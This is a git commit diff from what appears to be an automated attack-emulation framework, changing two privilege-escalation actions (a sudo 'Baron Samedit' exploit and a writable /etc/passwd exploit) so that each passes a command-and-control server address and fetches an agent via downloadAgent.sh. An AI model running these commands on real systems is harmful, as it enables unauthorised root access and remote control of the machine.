363c843c9a951ff887d8891180865e644afc4db9
Brian Singer <brian@convolve.com>
2025-10-29 13:41:18 -0400

    fix priv esc bug

--- incalmo/core/actions/LowLevel/privledge_escalation/sudo_baron.py
+++ incalmo/core/actions/LowLevel/privledge_escalation/sudo_baron.py
@@ -3,14 +3,15 @@ import asyncio
 from incalmo.models.command_result import CommandResult
 from incalmo.core.actions.low_level_action import LowLevelAction
 from incalmo.models.agent import Agent
-
+from incalmo.core.services.config_service import ConfigService
 from incalmo.core.models.events import Event
 
 
 class SudoBaronExploit(LowLevelAction):
     def __init__(self, agent: Agent):
-        command = "python3 sudo_baron_exploit.py"
-        payloads = ["sudo_baron_exploit.py"]
+        server = ConfigService().get_config().c2c_server
+        command = f"echo '/bin/bash downloadAgent.sh {server}' | python3 sudo_baron_exploit.py"
+        payloads = ["sudo_baron_exploit.py", "downloadAgent.sh"]
         super().__init__(agent, command, payloads)
 
     async def get_result(
--- incalmo/core/actions/LowLevel/privledge_escalation/writeable_passwd.py
+++ incalmo/core/actions/LowLevel/privledge_escalation/writeable_passwd.py
@@ -3,11 +3,13 @@ from incalmo.core.actions.low_level_action import LowLevelAction
 from incalmo.models.agent import Agent
 from incalmo.core.models.events import Event
 from incalmo.models.command_result import CommandResult
+from incalmo.core.services.config_service import ConfigService
 
 
 class WriteablePasswdExploit(LowLevelAction):
     def __init__(self, agent: Agent):
-        command = "./writeable_passwd.sh"
+        server = ConfigService().get_config().c2c_server
+        command = f"bash writeable_passwd.sh {server}"
         payloads = ["downloadAgent.sh", "writeable_passwd.sh"]
         super().__init__(agent, command, payloads, command_delay=3)
 
